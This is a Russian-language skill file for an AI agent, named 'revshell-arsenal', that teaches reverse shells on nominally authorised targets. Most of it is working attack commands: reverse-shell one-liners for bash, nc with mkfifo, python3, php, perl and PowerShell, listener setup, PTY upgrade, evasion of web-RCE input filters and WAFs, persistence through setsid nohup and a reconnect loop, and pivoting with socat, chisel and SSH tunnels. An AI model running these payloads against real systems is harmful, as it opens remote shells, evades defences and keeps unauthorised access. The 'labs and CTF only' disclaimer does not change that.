---
name: revshell-arsenal
description: Используй этот скилл, когда нужен обратный шелл или апгрейд PTY на авторизованной цели: листенеры через PTY, однострочники bash/python/php/perl/powershell, апгрейд до интерактивного PTY, обход ограничений (python3 -c, /dev/tcp, busybox) и стабилизация сессий.
---
# Revshell Arsenal — обратные шеллы (авторизованные цели)

## 0. Границы

Только лаборатории, CTF и явно авторизованные цели. Это закрепление доступа после найденной уязвимости, не сама уязвимость. Актуальные кодированные/TLS-варианты — генераторы (revshells.com, pentestmonkey cheatsheet).

## 1. Листенер

- В платформе с PTY-инструментами (например, `shell_open`) держи листенер в живой сессии: `nc -lvnp 9001` — видно вывод, можно вводить команды.
- Полноценный TTY сразу: `socat TCP-LISTEN:9001,reuseaddr,fork EXEC:'bash -li',pty,stderr,setsid,sigint,sane` (в PTY-сессии).
- Долгое ожидание подключения — фоновый мониторинг вывода листенера, а не цикл «запусти-проверь».

## 2. Классические однострочники (заменить IP/PORT)

**bash**: `bash -i >& /dev/tcp/IP/PORT 0>&1`

**sh через mkfifo**: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc IP PORT > /tmp/f`

**python3**: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`

**php**: `php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`

**perl**: `perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

**powershell (Windows-цель)**: `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS> ';$b2=[text.Encoding]::ASCII.GetBytes($r2);$s.Write($b2,0,$b2.Length);$s.Flush()};$c.Close()"`

**powercat** (передать на цель): `powercat -c IP -p PORT -e cmd`

## 3. Апгрейд голого шелла до интерактивного

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'   # нет python3: script -qc bash /dev/null
# Ctrl-Z, затем на листенере:
stty raw -echo; fg
# в шелле цели:
export TERM=xterm; stty rows 40 cols 120
```

Без python смотри `/dev/tcp`, `script`, socat на цели. Windows-цель: powershell-вариант из §2 уже интерактивный (conpty-паттерн).

## 4. Обход фильтров ввода (web RCE)

- Пробелы → `${IFS}`: `cat${IFS}/etc/passwd`.
- Вырезание символов → конкатенация: `c""url`, `cu''rl`, `$u=curl;$u ...`.
- Слэши/кавычки → base64-обёртка пейлоада целиком.
- Лимит длины → записать длинную команду в файл по частям/`wget`, затем выполнить.
- URL-кодировать всё при передаче в параметр; HTML-entity при XSS-канале.
- WAF на тело → `%xx`-вариации, unicode, вынос в заголовок.

## 5. Порядок работы (не гадай)

1. До шелла проверь исходящий трафик цели: `curl http://IP:PORT/` к листенеру. Нет — пробуй порты 443/53/80, UDP, DNS-каналы (dnscat2).
2. Листенер поднят заранее → триггеришь уязвимость → подключение.
3. Апгрейд до PTY (§3) → закрепление (`setsid nohup ... &`) → разведка: см. `linux-privesc`.
4. Обрывы — норма: ретрай-цикл на цели (`while true; do bash -i >& /dev/tcp/IP/PORT 0>&1; sleep 5; done`), листенер с `fork`.

## 6. Пивот и туннели (кратко)

- Проброс порта через compromised-хост: socat-форвард на цели (`TCP-LISTEN:8000,fork,TCP:TARGET:22`).
- Туннель целиком: chisel / SSH `-R`/`-L`; в туннеле работают и листенер, и SOCKS-прокси для инструментов.

## Готча (ловушки)
- `nc -e` нет в busybox/OpenBSD: `mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc HOST PORT > /tmp/f`.
- `python3 -c '...'`: одинарные кавычки снаружи, двойные внутри (PowerShell съест иначе).
- Интерактив: `script -qc /bin/bash /dev/null` для PTY, не игрушки с ключами.
- Файрволы: слушай на 443/8443, используй TCP-ретраи.
